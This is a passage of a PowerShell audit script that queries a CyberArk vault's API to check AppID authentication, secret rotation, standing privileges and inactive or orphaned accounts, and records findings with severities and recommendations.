                -CurrentValue "$($certPlatforms.Count) certificate/key platforms" `
                -ExpectedValue "Certificate platforms properly configured" `
                -Recommendation "Ensure certificate platforms have proper lifecycle management" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
}

function Test-AppIDSecurity {
    Write-AuditLog "Validating AppID security configuration (MID5)..." -Level Info

    # Try to get Applications (AAM/CCP configuration)
    $applications = Invoke-CyberArkAPI -Endpoint "/Applications"
    
    if (-not $applications) {
        # Try legacy endpoint
        $applications = Invoke-CyberArkAPI -Endpoint "/WebServices/PIMServices.svc/Applications"
    }

    if (-not $applications) {
        Add-SkippedCheck -Category "Machine Identity" -CISControl "MID5" `
            -CheckName "AppID Security" `
            -Reason "Applications endpoint not accessible - AAM/CCP may not be deployed" `
            -Type "NotApplicable"
        return
    }

    $weakAppIDs = @()
    $noAllowedMachines = @()

    foreach ($app in $applications.Application) {
        $appId = $app.AppID

        # Get authentication details
        $appAuth = Invoke-CyberArkAPI -Endpoint "/Applications/$appId/Authentications"
        
        if ($appAuth) {
            $authMethods = $appAuth.authentication | Measure-Object | Select-Object -ExpandProperty Count
            
            # Check for weak authentication
            if ($authMethods -lt $script:Config.MinAppIDAuthMethods) {
                $weakAppIDs += $appId
            }

            # Check for allowed machines
            $machineAuth = $appAuth.authentication | Where-Object { $_.AuthType -eq "machineAddress" }
            if (-not $machineAuth -and $script:Config.RequireAllowedMachines) {
                $noAllowedMachines += $appId
            }
        }
    }

    if ($weakAppIDs.Count -gt 0) {
        Add-Finding -Category "Machine Identity" `
            -CISControl "MID5" `
            -Finding "AppIDs with insufficient authentication methods" `
            -Resource "Application Authentication" `
            -CurrentValue "$($weakAppIDs.Count) AppIDs with < $($script:Config.MinAppIDAuthMethods) auth methods" `
            -ExpectedValue "Multiple authentication methods per AppID" `
            -Recommendation "Add additional authentication methods (hash, path, OS user)" `
            -Severity "High"
    }

    if ($noAllowedMachines.Count -gt 0) {
        Add-Finding -Category "Machine Identity" `
            -CISControl "MID5" `
            -Finding "AppIDs without allowed machines restriction" `
            -Resource "Application Security" `
            -CurrentValue "$($noAllowedMachines.Count) AppIDs without machine restrictions" `
            -ExpectedValue "All AppIDs restricted to specific machines" `
            -Recommendation "Configure allowed machines for all AppIDs" `
            -Severity "High"
    }
}

function Test-StaleMachineIdentities {
    Write-AuditLog "Detecting stale machine identities (MID6)..." -Level Info

    $users = Invoke-CyberArkAPI -Endpoint "/Users?limit=$($script:Config.PageLimit)"
    
    if (-not $users) {
        Add-SkippedCheck -Category "Machine Identity" -CISControl "MID6" `
            -CheckName "Stale Machine Identities" `
            -Reason "Could not retrieve users from API" `
            -Type "Error"
        return
    }

    $threshold = (Get-Date).AddDays(-$script:Config.MaxStaleIdentityDays)
    $serviceAccountPatterns = @("svc_", "service", "app_", "batch", "system", "_sa")
    $staleMachineIdentities = @()

    foreach ($user in $users.Users) {
        $userName = $user.userName.ToLower()
        $isServiceAccount = $false

        foreach ($pattern in $serviceAccountPatterns) {
            if ($userName -match $pattern) {
                $isServiceAccount = $true
                break
            }
        }

        if ($isServiceAccount -or $user.userType -eq "ServiceUser") {
            if ($user.lastSuccessfulLoginDate) {
                $lastLogin = [DateTime]::Parse($user.lastSuccessfulLoginDate)
                if ($lastLogin -lt $threshold) {
                    $staleMachineIdentities += @{
                        UserName = $user.userName
                        LastLogin = $lastLogin
                        DaysInactive = ((Get-Date) - $lastLogin).Days
                    }
                }
            } elseif (-not $user.lastSuccessfulLoginDate) {
                # Never logged in
                $staleMachineIdentities += @{
                    UserName = $user.userName
                    LastLogin = $null
                    DaysInactive = "Never"
                }
            }
        }
    }

    if ($staleMachineIdentities.Count -gt 0) {
        Add-Finding -Category "Machine Identity" `
            -CISControl "MID6" `
            -Finding "Stale machine identities detected" `
            -Resource "Machine Identity Lifecycle" `
            -CurrentValue "$($staleMachineIdentities.Count) stale identities (inactive > $($script:Config.MaxStaleIdentityDays) days)" `
            -ExpectedValue "All machine identities active or removed" `
            -Recommendation "Review and remove/disable stale machine identities" `
            -Severity "Medium"
    }
}

#======================================================================
# SECRETS MANAGEMENT CHECKS (SEC1-SEC8)
#======================================================================

function Test-SecretsManagement {
    Write-AuditLog "Auditing Secrets Management Security..." -Level Info

    Test-CredentialProviderDeployment
    Test-AppIDAuthenticationStrength
    Test-AllowedMachinesConfiguration
    Test-CacheTTLSettings
    Test-CCPTLSConfiguration
    Test-SecretRotationPolicy
    Test-OrphanSecretsDetection
    Test-CredentialSprawlAnalysis
}

function Test-CredentialProviderDeployment {
    Write-AuditLog "Checking Credential Provider deployment (SEC1)..." -Level Info

    # Check for CCP/AIM components
    $components = Invoke-CyberArkAPI -Endpoint "/ComponentsMonitoringDetails/all"
    
    if ($components) {
        $ccpComponents = $components.Components | Where-Object { 
            $_.ComponentType -match "CCP|AIM|CP|CredentialProvider" 
        }

        if ($ccpComponents) {
            foreach ($ccp in $ccpComponents) {
                if (-not $ccp.IsLoggedOn) {
                    Add-Finding -Category "Secrets Management" `
                        -CISControl "SEC1" `
                        -Finding "Credential Provider not connected" `
                        -Resource $ccp.ComponentName `
                        -CurrentValue "Disconnected" `
                        -ExpectedValue "Connected and operational" `
                        -Recommendation "Investigate Credential Provider connectivity" `
                        -Severity "Critical"
                }
            }
        } else {
            Add-Finding -Category "Secrets Management" `
                -CISControl "SEC1" `
                -Finding "No Credential Provider components detected" `
                -Resource "CCP/AIM Deployment" `
                -CurrentValue "No CCP/AIM found in monitoring" `
                -ExpectedValue "Credential Provider deployed for application access" `
                -Recommendation "Deploy CyberArk Credential Provider for secure application access" `
                -Severity "Medium"
        }
    }

    # Check CCP endpoint accessibility
    $ccpEndpoints = @(
        "/AIMWebService/api/Accounts",
        "/AIMWebService/v1.1/aim/accounts"
    )

    foreach ($endpoint in $ccpEndpoints) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$endpoint" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
            
            Add-Finding -Category "Secrets Management" `
                -CISControl "SEC1" `
                -Finding "CCP endpoint detected" `
                -Resource $endpoint `
                -CurrentValue "Endpoint accessible" `
                -ExpectedValue "CCP properly secured" `
                -Recommendation "Ensure CCP endpoint requires proper authentication" `
                -Severity "Info" `
                -Status "Pass"
            break
        }
        catch { }
    }
}

function Test-AppIDAuthenticationStrength {
    Write-AuditLog "Assessing AppID authentication strength (SEC2)..." -Level Info

    $applications = Invoke-CyberArkAPI -Endpoint "/Applications"
    
    if (-not $applications -or -not $applications.Application) {
        Add-SkippedCheck -Category "Secrets Management" -CISControl "SEC2" `
            -CheckName "AppID Authentication" `
            -Reason "No applications found or AAM not deployed" `
            -Type "NotApplicable"
        return
    }

    $weakAuth = @()
    $strongAuth = 0

    foreach ($app in $applications.Application) {
        $appId = $app.AppID
        $appAuth = Invoke-CyberArkAPI -Endpoint "/Applications/$appId/Authentications"
        
        if ($appAuth -and $appAuth.authentication) {
            $authTypes = $appAuth.authentication | Select-Object -ExpandProperty AuthType -Unique
            
            # Check for strong authentication methods
            $hasHash = $authTypes -contains "hash"
            $hasCert = $authTypes -contains "certificate" -or $authTypes -contains "certificateSerialNumber"
            $hasOsUser = $authTypes -contains "osUser"
            $hasMachine = $authTypes -contains "machineAddress"

            if (($hasHash -or $hasCert) -and ($hasOsUser -or $hasMachine)) {
                $strongAuth++
            } else {
                $weakAuth += @{
                    AppID = $appId
                    AuthTypes = $authTypes -join ", "
                }
            }
        }
    }

    if ($weakAuth.Count -gt 0) {
        Add-Finding -Category "Secrets Management" `
            -CISControl "SEC2" `
            -Finding "AppIDs with weak authentication configuration" `
            -Resource "Application Authentication" `
            -CurrentValue "$($weakAuth.Count) AppIDs lacking strong multi-factor auth" `
            -ExpectedValue "Hash/cert + machine/osUser authentication" `
            -Recommendation "Add hash verification, certificate auth, and restrict by machine/OS user" `
            -Severity "High"
    }
}

function Test-AllowedMachinesConfiguration {
    Write-AuditLog "Validating allowed machines configuration (SEC3)..." -Level Info

    $applications = Invoke-CyberArkAPI -Endpoint "/Applications"
    
    if (-not $applications -or -not $applications.Application) {
        Add-SkippedCheck -Category "Secrets Management" -CISControl "SEC3" `
            -CheckName "Allowed Machines" `
            -Reason "No applications found" `
            -Type "NotApplicable"
        return
    }

    $noMachineRestriction = @()
    $wildcardMachine = @()

    foreach ($app in $applications.Application) {
        $appId = $app.AppID
        $appAuth = Invoke-CyberArkAPI -Endpoint "/Applications/$appId/Authentications"
        
        if ($appAuth -and $appAuth.authentication) {
            $machineAuth = $appAuth.authentication | Where-Object { $_.AuthType -eq "machineAddress" }
            
            if (-not $machineAuth) {
                $noMachineRestriction += $appId
            } else {
                # Check for overly permissive wildcards
                foreach ($auth in $machineAuth) {
                    if ($auth.AuthValue -match "^\*$|0\.0\.0\.0|any|\*\.\*\.\*\.\*") {
                        $wildcardMachine += $appId
                    }
                }
            }
        }
    }

    if ($noMachineRestriction.Count -gt 0) {
        Add-Finding -Category "Secrets Management" `
            -CISControl "SEC3" `
            -Finding "AppIDs without machine address restrictions" `
            -Resource "Allowed Machines" `
            -CurrentValue "$($noMachineRestriction.Count) unrestricted AppIDs" `
            -ExpectedValue "All AppIDs restricted to specific machines" `
            -Recommendation "Configure allowed machine addresses for all AppIDs" `
            -Severity "High"
    }

    if ($wildcardMachine.Count -gt 0) {
        Add-Finding -Category "Secrets Management" `
            -CISControl "SEC3" `
            -Finding "AppIDs with overly permissive machine wildcards" `
            -Resource "Allowed Machines" `
            -CurrentValue "$($wildcardMachine.Count) AppIDs with wildcard machines" `
            -ExpectedValue "Specific machine addresses only" `
            -Recommendation "Replace wildcards with specific IP addresses or hostnames" `
            -Severity "Medium"
    }
}

function Test-CacheTTLSettings {
    Write-AuditLog "Checking cache TTL settings (SEC4)..." -Level Info

    # This would require access to CP configuration files or registry
    # For now, provide guidance check

    Add-Finding -Category "Secrets Management" `
        -CISControl "SEC4" `
        -Finding "Cache TTL configuration (manual verification required)" `
        -Resource "Credential Provider Cache" `
        -CurrentValue "Manual check required" `
        -ExpectedValue "TTL < 7 days for standard, < 1 day for sensitive" `
        -Recommendation "Verify CP cache TTL in basic_appprovider.conf (CacheRefreshInterval, CachePath)" `
        -Severity "Info" `
        -Status "Pass"
}

function Test-CCPTLSConfiguration {
    Write-AuditLog "Checking CCP TLS/mTLS configuration (SEC5)..." -Level Info

    $ccpEndpoints = @(
        "/AIMWebService/api/Accounts",
        "/AIMWebService/v1.1/aim/accounts"
    )

    foreach ($endpoint in $ccpEndpoints) {
        try {
            # Check TLS configuration
            $uri = "$PVWA$endpoint"
            $request = [System.Net.HttpWebRequest]::Create($uri)
            $request.Timeout = 10000
            
            try {
                $response = $request.GetResponse()
                $cert = $request.ServicePoint.Certificate
                
                if ($cert) {
                    # Check certificate details
                    $certExpiry = [DateTime]::Parse($cert.GetExpirationDateString())
                    $daysToExpiry = ($certExpiry - (Get-Date)).Days
                    
                    if ($daysToExpiry -lt $script:Config.CertificateExpiryWarningDays) {
                        Add-Finding -Category "Secrets Management" `
                            -CISControl "SEC5" `
                            -Finding "CCP certificate expiring soon" `
                            -Resource $endpoint `
                            -CurrentValue "Expires in $daysToExpiry days" `
                            -ExpectedValue "Certificate valid > $($script:Config.CertificateExpiryWarningDays) days" `
                            -Recommendation "Renew CCP TLS certificate" `
                            -Severity "High"
                    }
                }
                $response.Close()
            }
            catch { }
        }
        catch { }
    }

    # Check if mTLS is enforced (client certificate required)
    Add-Finding -Category "Secrets Management" `
        -CISControl "SEC5" `
        -Finding "CCP mTLS configuration (manual verification)" `
        -Resource "CCP TLS Settings" `
        -CurrentValue "Manual verification required" `
        -ExpectedValue "mTLS enabled for sensitive applications" `
        -Recommendation "Configure mutual TLS for CCP access where possible" `
        -Severity "Info" `
        -Status "Pass"
}

function Test-SecretRotationPolicy {
    Write-AuditLog "Checking secret rotation policy enforcement (SEC6)..." -Level Info

    $accounts = Invoke-CyberArkAPI -Endpoint "/Accounts?limit=$($script:Config.PageLimit)"
    
    if (-not $accounts) {
        Add-SkippedCheck -Category "Secrets Management" -CISControl "SEC6" `
            -CheckName "Secret Rotation Policy" `
            -Reason "Could not retrieve accounts" `
            -Type "Error"
        return
    }

    $noRotation = 0
    $staleSecrets = 0
    $threshold = (Get-Date).AddDays(-$script:Config.MaxSecretAgeDays)

    foreach ($account in $accounts.value) {
        if ($account.secretManagement.automaticManagementEnabled -eq $false) {
            $noRotation++
        }

        if ($account.secretManagement.lastModifiedTime) {
            $lastMod = [DateTime]::Parse($account.secretManagement.lastModifiedTime)
            if ($lastMod -lt $threshold) {
                $staleSecrets++
            }
        }
    }

    if ($noRotation -gt 0) {
        Add-Finding -Category "Secrets Management" `
            -CISControl "SEC6" `
            -Finding "Accounts without automatic rotation" `
            -Resource "Secret Rotation" `
            -CurrentValue "$noRotation accounts without auto-rotation" `
            -ExpectedValue "All accounts with automatic rotation enabled" `
            -Recommendation "Enable automatic password management for all accounts" `
            -Severity "Medium"
    }

    if ($staleSecrets -gt 0) {
        Add-Finding -Category "Secrets Management" `
            -CISControl "SEC6" `
            -Finding "Secrets exceeding age threshold" `
            -Resource "Secret Age" `
            -CurrentValue "$staleSecrets secrets older than $($script:Config.MaxSecretAgeDays) days" `
            -ExpectedValue "All secrets rotated within policy period" `
            -Recommendation "Rotate stale secrets and investigate rotation failures" `
            -Severity "Medium"
    }
}

function Test-OrphanSecretsDetection {
    Write-AuditLog "Detecting orphan/unmanaged secrets (SEC7)..." -Level Info

    $accounts = Invoke-CyberArkAPI -Endpoint "/Accounts?limit=$($script:Config.PageLimit)"
    
    if (-not $accounts) {
        Add-SkippedCheck -Category "Secrets Management" -CISControl "SEC7" `
            -CheckName "Orphan Secrets" `
            -Reason "Could not retrieve accounts" `
            -Type "Error"
        return
    }

    $orphanSecrets = @()

    foreach ($account in $accounts.value) {
        # Check for unmanaged accounts
        if ($account.secretManagement.status -match "unmanaged|failed|error") {
            $orphanSecrets += @{
                Name = $account.name
                Safe = $account.safeName
                Status = $account.secretManagement.status
            }
        }

        # Check for accounts without platform
        if (-not $account.platformId) {
            $orphanSecrets += @{
                Name = $account.name
                Safe = $account.safeName
                Status = "No platform assigned"
            }
        }
    }

    if ($orphanSecrets.Count -gt 0) {
        Add-Finding -Category "Secrets Management" `
            -CISControl "SEC7" `
            -Finding "Orphan or unmanaged secrets detected" `
            -Resource "Secret Lifecycle" `
            -CurrentValue "$($orphanSecrets.Count) orphan/unmanaged secrets" `
            -ExpectedValue "All secrets properly managed" `
            -Recommendation "Review and remediate orphan secrets; assign platforms and enable management" `
            -Severity "Medium"
    }
}

function Test-CredentialSprawlAnalysis {
    Write-AuditLog "Analyzing credential sprawl (SEC8)..." -Level Info

    $applications = Invoke-CyberArkAPI -Endpoint "/Applications"
    $accounts = Invoke-CyberArkAPI -Endpoint "/Accounts?limit=$($script:Config.PageLimit)"
    
    if (-not $accounts) {
        Add-SkippedCheck -Category "Secrets Management" -CISControl "SEC8" `
            -CheckName "Credential Sprawl" `
            -Reason "Could not retrieve accounts" `
            -Type "Error"
        return
    }

    # Analyze credential distribution
    $safeCredentialCount = @{}
    foreach ($account in $accounts.value) {
        $safe = $account.safeName
        if (-not $safeCredentialCount.ContainsKey($safe)) {
            $safeCredentialCount[$safe] = 0
        }
        $safeCredentialCount[$safe]++
    }

    # Check for safes with excessive credentials (potential sprawl)
    $highDensitySafes = $safeCredentialCount.GetEnumerator() | Where-Object { $_.Value -gt 100 }

    if ($highDensitySafes.Count -gt 0) {
        Add-Finding -Category "Secrets Management" `
            -CISControl "SEC8" `
            -Finding "High credential density safes detected" `
            -Resource "Credential Distribution" `
            -CurrentValue "$($highDensitySafes.Count) safes with >100 credentials" `
            -ExpectedValue "Balanced credential distribution" `
            -Recommendation "Review safe organization; consider splitting large safes" `
            -Severity "Low"
    }

    # Check for duplicate credential patterns
    $credentialPatterns = @{}
    foreach ($account in $accounts.value) {
        $pattern = "$($account.userName)@$($account.address)"
        if (-not $credentialPatterns.ContainsKey($pattern)) {
            $credentialPatterns[$pattern] = @()
        }
        $credentialPatterns[$pattern] += $account.safeName
    }

    $duplicates = $credentialPatterns.GetEnumerator() | Where-Object { $_.Value.Count -gt 1 }

    if ($duplicates.Count -gt 0) {
        Add-Finding -Category "Secrets Management" `
            -CISControl "SEC8" `
            -Finding "Potential duplicate credentials across safes" `
            -Resource "Credential Sprawl" `
            -CurrentValue "$($duplicates.Count) credentials in multiple safes" `
            -ExpectedValue "Single source of truth per credential" `
            -Recommendation "Consolidate duplicate credentials and use access controls instead" `
            -Severity "Low"
    }
}

#======================================================================
# ZERO STANDING PRIVILEGES CHECKS (ZSP1-ZSP5)
#======================================================================

function Test-ZeroStandingPrivileges {
    Write-AuditLog "Auditing Zero Standing Privileges (JIT Access)..." -Level Info

    Test-PermanentPrivilegedAccess
    Test-DualControlWorkflows
    Test-ConcurrentSessionLimits
    Test-CheckInCheckOutEnforcement
    Test-StandingPrivilegeRecommendations
}

function Test-PermanentPrivilegedAccess {
    Write-AuditLog "Checking for permanent privileged access (ZSP1)..." -Level Info

    $safes = Invoke-CyberArkAPI -Endpoint "/Safes?limit=$($script:Config.PageLimit)"
    
    if (-not $safes) {
        Add-SkippedCheck -Category "Zero Standing Privileges" -CISControl "ZSP1" `
            -CheckName "Permanent Privileged Access" `
            -Reason "Could not retrieve safes" `
            -Type "Error"
        return
    }

    $permanentAccessCount = 0
    $sensitivePatterns = @("admin", "root", "domain", "prod", "tier0", "tier1", "privileged")

    foreach ($safe in $safes.value) {
        $safeName = $safe.safeName
        
        # Check if this is a sensitive safe
        $isSensitive = $false
        foreach ($pattern in $sensitivePatterns) {
            if ($safeName -match $pattern) {
                $isSensitive = $true
                break
            }
        }

        if (-not $isSensitive) { continue }

        $members = Invoke-CyberArkAPI -Endpoint "/Safes/$safeName/Members"
        
        if ($members -and $members.value) {
            foreach ($member in $members.value) {
                # Check for permanent access (no expiration, no workflow)
                if ($member.membershipExpirationDate -eq $null -and 
                    $member.permissions.UseAccounts -eq $true -and
                    $member.memberType -eq "User") {
                    $permanentAccessCount++
                }
            }
        }
    }

    if ($permanentAccessCount -gt 0) {
        Add-Finding -Category "Zero Standing Privileges" `
            -CISControl "ZSP1" `
            -Finding "Permanent privileged access detected in sensitive safes" `
            -Resource "Standing Privileges" `
            -CurrentValue "$permanentAccessCount users with permanent access" `
            -ExpectedValue "Just-in-time access for sensitive safes" `
            -Recommendation "Implement JIT access with time-limited permissions" `
            -Severity "High"
    }
}

function Test-DualControlWorkflows {
    Write-AuditLog "Checking dual control workflows (ZSP2)..." -Level Info

    $safes = Invoke-CyberArkAPI -Endpoint "/Safes?limit=$($script:Config.PageLimit)"
    
    if (-not $safes) {
        Add-SkippedCheck -Category "Zero Standing Privileges" -CISControl "ZSP2" `
            -CheckName "Dual Control Workflows" `
            -Reason "Could not retrieve safes" `
            -Type "Error"
        return
    }

    $sensitivePatterns = @("admin", "root", "domain", "prod", "tier0", "privileged")
    $noDualControl = @()

    foreach ($safe in $safes.value) {
        $safeName = $safe.safeName
        
        # Check if this is a sensitive safe
        $isSensitive = $false
        foreach ($pattern in $sensitivePatterns) {
            if ($safeName -match $pattern) {
                $isSensitive = $true
                break
            }
        }

        if ($isSensitive) {
            # Check safe properties for dual control
            $safeDetails = Invoke-CyberArkAPI -Endpoint "/Safes/$safeName"
            
            if ($safeDetails) {
                if ($safeDetails.numberOfDaysRetention -eq $null -or 
                    $safeDetails.requiresApproval -eq $false) {
                    $noDualControl += $safeName
                }
            }
        }
    }

    if ($noDualControl.Count -gt 0) {
        Add-Finding -Category "Zero Standing Privileges" `
            -CISControl "ZSP2" `
            -Finding "Sensitive safes without dual control" `
            -Resource "Approval Workflows" `
            -CurrentValue "$($noDualControl.Count) safes without approval requirements" `
            -ExpectedValue "Dual control for all sensitive safes" `
            -Recommendation "Enable dual control and approval workflows for sensitive safes" `
            -Severity "High"
    }
}

function Test-ConcurrentSessionLimits {
    Write-AuditLog "Checking concurrent session limits (ZSP3)..." -Level Info

    # Check Master Policy for concurrent session settings
    $masterPolicy = Invoke-CyberArkAPI -Endpoint "/Platforms/MasterPolicy"
    
    if (-not $masterPolicy) {
        $masterPolicy = Invoke-CyberArkAPI -Endpoint "/Configuration/MasterPolicy"
    }

    if ($masterPolicy -and $masterPolicy.Details) {
        if ($masterPolicy.Details.MaxConcurrentConnections -eq $null -or 
            $masterPolicy.Details.MaxConcurrentConnections -gt 5) {
            Add-Finding -Category "Zero Standing Privileges" `
                -CISControl "ZSP3" `
                -Finding "Excessive concurrent session limit" `
                -Resource "Master Policy" `
                -CurrentValue "Max concurrent: $($masterPolicy.Details.MaxConcurrentConnections)" `
                -ExpectedValue "Limited concurrent sessions (1-5)" `
                -Recommendation "Limit concurrent sessions to prevent credential sharing" `
                -Severity "Medium"
        }
    }

    # Check system configuration
    $systemConfig = Invoke-CyberArkAPI -Endpoint "/Configuration/System"
    
    if ($systemConfig) {
        if ($systemConfig.SessionTimeout -gt $script:Config.SessionTimeoutMinutes) {
            Add-Finding -Category "Zero Standing Privileges" `
                -CISControl "ZSP3" `
                -Finding "Session timeout exceeds recommended value" `
                -Resource "Session Configuration" `
                -CurrentValue "Timeout: $($systemConfig.SessionTimeout) minutes" `
                -ExpectedValue "Timeout <= $($script:Config.SessionTimeoutMinutes) minutes" `
                -Recommendation "Reduce session timeout to limit privilege duration" `
                -Severity "Medium"
        }
    }
}

function Test-CheckInCheckOutEnforcement {
    Write-AuditLog "Checking check-in/check-out enforcement (ZSP4)..." -Level Info

    $masterPolicy = Invoke-CyberArkAPI -Endpoint "/Platforms/MasterPolicy"
    
    if (-not $masterPolicy) {
        $masterPolicy = Invoke-CyberArkAPI -Endpoint "/Configuration/MasterPolicy"
    }

    if ($masterPolicy -and $masterPolicy.Details) {
        if ($masterPolicy.Details.EnforceCheckinCheckoutExclusiveAccess -eq $false) {
            Add-Finding -Category "Zero Standing Privileges" `
                -CISControl "ZSP4" `
                -Finding "Check-in/check-out not enforced" `
                -Resource "Master Policy" `
                -CurrentValue "Exclusive access disabled" `
                -ExpectedValue "Exclusive access enabled" `
                -Recommendation "Enable exclusive access to track credential usage" `
                -Severity "High"
        }
    }

    # Check platforms for check-in/check-out settings
    $platforms = Invoke-CyberArkAPI -Endpoint "/Platforms"
    
    if ($platforms -and $platforms.Platforms) {
        $noCheckout = 0
        foreach ($platform in $platforms.Platforms) {
            if ($platform.privilegedAccessWorkflows.requireCheckin -eq $false -and
                $platform.general.platformType -match "Windows|Unix|Database") {
                $noCheckout++
            }
        }

        if ($noCheckout -gt 0) {
            Add-Finding -Category "Zero Standing Privileges" `
                -CISControl "ZSP4" `
                -Finding "Platforms without check-in/check-out" `
                -Resource "Platform Configuration" `
                -CurrentValue "$noCheckout platforms without check-in requirement" `
                -ExpectedValue "Check-in/check-out for all privileged platforms" `
                -Recommendation "Enable check-in/check-out on privileged platforms" `
                -Severity "Medium"
        }
    }
}

function Test-StandingPrivilegeRecommendations {
    Write-AuditLog "Generating standing privilege reduction recommendations (ZSP5)..." -Level Info

    # Analyze overall JIT readiness
    $jitReadinessScore = 100
    $recommendations = @()

    # Check for exclusive access
    $masterPolicy = Invoke-CyberArkAPI -Endpoint "/Platforms/MasterPolicy"
    if ($masterPolicy -and $masterPolicy.Details.EnforceCheckinCheckoutExclusiveAccess -eq $false) {
        $jitReadinessScore -= 20
        $recommendations += "Enable exclusive access enforcement"
    }

    # Check for dual control
    if ($masterPolicy -and $masterPolicy.Details.RequireDualControlPasswordAccessApproval -eq $false) {
        $jitReadinessScore -= 20
        $recommendations += "Implement dual control for password access"
    }

    # Check for one-time passwords
    if ($masterPolicy -and $masterPolicy.Details.EnforceOnetimePasswordAccess -eq $false) {
        $jitReadinessScore -= 15
        $recommendations += "Consider one-time password access for high-risk accounts"
    }

    # Check for session limits
    if ($masterPolicy -and $masterPolicy.Details.MaxConcurrentConnections -gt 3) {
        $jitReadinessScore -= 10
        $recommendations += "Reduce concurrent session limits"
    }

    $severity = if ($jitReadinessScore -ge 80) { "Low" } 
                elseif ($jitReadinessScore -ge 60) { "Medium" } 
                else { "High" }

    Add-Finding -Category "Zero Standing Privileges" `
        -CISControl "ZSP5" `
        -Finding "JIT/ZSP Readiness Assessment" `
        -Resource "Standing Privilege Analysis" `
        -CurrentValue "JIT Readiness Score: $jitReadinessScore%" `
        -ExpectedValue "Score >= 80% for ZSP maturity" `
        -Recommendation ($recommendations -join "; ") `
        -Severity $severity
}

#======================================================================
# IDENTITY GOVERNANCE CHECKS (IGA1-IGA8)
#======================================================================

function Test-IdentityGovernance {
    Write-AuditLog "Auditing Identity Governance..." -Level Info

    Test-OrphanedIdentities
    Test-PermissionDrift
    Test-InactiveUserAccounts
    Test-ExcessiveSafeMemberships
    Test-AccessCertificationStatus
    Test-RoleMembershipSprawl
    Test-PendingAccountQueueAge
    Test-AccountOwnershipGaps
}

function Test-OrphanedIdentities {
    Write-AuditLog "Detecting orphaned identities (IGA1)..." -Level Info

    $users = Invoke-CyberArkAPI -Endpoint "/Users?limit=$($script:Config.PageLimit)"
    
    if (-not $users) {
        Add-SkippedCheck -Category "Identity Governance" -CISControl "IGA1" `
            -CheckName "Orphaned Identities" `
            -Reason "Could not retrieve users" `
            -Type "Error"
        return
    }

    $orphanedUsers = @()
    $threshold = (Get-Date).AddDays(-365)  # 1 year

    foreach ($user in $users.Users) {
        # Check for never-logged-in users created more than 30 days ago
        if (-not $user.lastSuccessfulLoginDate -and $user.createDate) {
            $createDate = [DateTime]::Parse($user.createDate)
            if ($createDate -lt (Get-Date).AddDays(-30)) {
                $orphanedUsers += @{
                    UserName = $user.userName
                    Reason = "Never logged in (created $((Get-Date).Subtract($createDate).Days) days ago)"
                }
            }
        }
        
        # Check for disabled users with safe access
        if ($user.disabled -eq $true) {
            $userGroups = Invoke-CyberArkAPI -Endpoint "/Users/$($user.id)/Groups"
            if ($userGroups -and $userGroups.value.Count -gt 0) {
                $orphanedUsers += @{
                    UserName = $user.userName
                    Reason = "Disabled but still has group memberships"
                }
            }
        }
    }

    if ($orphanedUsers.Count -gt 0) {
        Add-Finding -Category "Identity Governance" `
            -CISControl "IGA1" `
            -Finding "Orphaned identities detected" `
            -Resource "User Lifecycle" `
            -CurrentValue "$($orphanedUsers.Count) orphaned identities" `
            -ExpectedValue "No orphaned identities" `
            -Recommendation "Review and remove orphaned user accounts" `
            -Severity "Medium"
    }
}

function Test-PermissionDrift {
    Write-AuditLog "Detecting permission drift (IGA2)..." -Level Info

    $users = Invoke-CyberArkAPI -Endpoint "/Users?limit=$($script:Config.PageLimit)"
    $safes = Invoke-CyberArkAPI -Endpoint "/Safes?limit=$($script:Config.PageLimit)"
    
    if (-not $users -or -not $safes) {
        Add-SkippedCheck -Category "Identity Governance" -CISControl "IGA2" `
            -CheckName "Permission Drift" `
            -Reason "Could not retrieve users or safes" `
            -Type "Error"
        return
    }

    # Build user-safe access map
    $userSafeAccess = @{}
    $unusedPermissions = @()

    foreach ($safe in $safes.value) {
        $safeName = $safe.safeName
        if ($safeName -match "^(System|VaultInternal)") { continue }

        $members = Invoke-CyberArkAPI -Endpoint "/Safes/$safeName/Members"
        
        if ($members -and $members.value) {
            foreach ($member in $members.value) {
                if ($member.memberType -eq "User") {
                    $memberName = $member.memberName
                    
                    if (-not $userSafeAccess.ContainsKey($memberName)) {
                        $userSafeAccess[$memberName] = @{
                            Safes = @()
                            HighPermissions = 0
                        }
                    }
                    $userSafeAccess[$memberName].Safes += $safeName

                    # Count high-level permissions
                    if ($member.permissions.ManageSafe -or 
                        $member.permissions.ManageSafeMembers -or
                        $member.permissions.BackupSafe) {
                        $userSafeAccess[$memberName].HighPermissions++
                    }
                }
            }
        }
    }

    # Find users with potentially excessive permissions
    $excessivePermUsers = $userSafeAccess.GetEnumerator() | Where-Object {
        $_.Value.Safes.Count -gt $script:Config.MaxUserSafeMemberships -or
        $_.Value.HighPermissions -gt 5
    }

    if ($excessivePermUsers.Count -gt 0) {
        Add-Finding -Category "Identity Governance" `
            -CISControl "IGA2" `
            -Finding "Users with potential permission drift" `
            -Resource "Permission Analysis" `
            -CurrentValue "$($excessivePermUsers.Count) users with excessive permissions" `
            -ExpectedValue "Permissions aligned with current role" `
            -Recommendation "Review user permissions and remove unnecessary access" `
            -Severity "Medium"
    }
}

function Test-InactiveUserAccounts {
    Write-AuditLog "Detecting inactive user accounts (IGA3)..." -Level Info

    $users = Invoke-CyberArkAPI -Endpoint "/Users?limit=$($script:Config.PageLimit)"
    
    if (-not $users) {
        Add-SkippedCheck -Category "Identity Governance" -CISControl "IGA3" `
            -CheckName "Inactive Users" `
            -Reason "Could not retrieve users" `
            -Type "Error"
        return
    }

    $threshold = (Get-Date).AddDays(-$script:Config.MaxInactiveUserDays)
    $inactiveUsers = @()

    foreach ($user in $users.Users) {
        if ($user.lastSuccessfulLoginDate) {
            $lastLogin = [DateTime]::Parse($user.lastSuccessfulLoginDate)
            if ($lastLogin -lt $threshold -and $user.disabled -ne $true) {
                $inactiveUsers += @{
                    UserName = $user.userName
                    LastLogin = $lastLogin
                    DaysInactive = ((Get-Date) - $lastLogin).Days
                }
            }
        }
    }

    if ($inactiveUsers.Count -gt 0) {
        $oldest = ($inactiveUsers | Sort-Object DaysInactive -Descending | Select-Object -First 1)
        Add-Finding -Category "Identity Governance" `
            -CISControl "IGA3" `
            -Finding "Inactive user accounts detected" `
            -Resource "User Activity" `
            -CurrentValue "$($inactiveUsers.Count) users inactive > $($script:Config.MaxInactiveUserDays) days (max: $($oldest.DaysInactive) days)" `
            -ExpectedValue "All active users or accounts disabled" `
            -Recommendation "Disable or remove inactive user accounts" `
            -Severity "Medium"
    }
}

